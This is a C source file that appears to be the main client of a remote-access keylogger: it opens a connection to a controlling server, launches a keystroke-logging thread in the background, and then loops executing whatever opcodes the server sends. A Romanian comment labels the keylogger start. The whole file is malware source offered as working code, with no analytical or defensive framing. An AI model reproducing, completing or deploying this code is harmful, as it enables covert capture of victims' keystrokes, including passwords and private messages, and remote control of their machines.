#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include "keylog.h" // Include the keylogger header
#include "constraints.h"
#include "messageManager.h"
#include "clientManager.h"
#include "utils.h"

clientInfo_t clientData;

int main()
{
    int sock;
    connectionInitialize(&sock);
    clientData.serverSocket = sock;
    startingDataInitialize();

    clientData.isKeyLoggerActive = 1;

    if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0)
    {
        clientData.isKeyLoggerActive = 0;

        perror("Could not create thread");
    }
    pthread_detach(clientData.keyLoggerTid);

    message_t msg;
    // msg.opCode = 'S';
    // msg.size = 0;
    // handleOpcode(msg);
    // while (1)
    // {
    //     sleep(1);
    //     msg.opCode = 'S';
    //     msg.size = 0;
    //     handleOpcode(msg);
    // }
    while (1)
    {
        if (recvMessage(sock, &msg) <= 0)
            break;
        // printf("Recieved: %s(opcode %c)", msg.buffer, msg.opCode);
        handleOpcode(msg);
    }
    // Pornire Keylogger

    // Close the socket
    close(sock);

    return 0;
}